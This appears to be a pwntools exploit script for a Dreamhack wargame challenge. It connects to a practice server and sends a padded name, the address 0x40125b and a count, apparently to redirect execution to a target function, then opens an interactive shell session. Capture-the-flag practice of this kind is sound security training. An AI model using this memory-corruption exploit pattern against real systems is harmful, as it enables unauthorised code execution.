from pwn import *

p=remote("host8.dreamhack.games",18170)

name=b'A'*15
value=0x40125b
count=b"4"

p.sendlineafter(b"name: ",name)
p.sendlineafter(b"hex value: ",hex(value).encode())
p.sendlineafter(b"integer count: ",count)

p.interactive()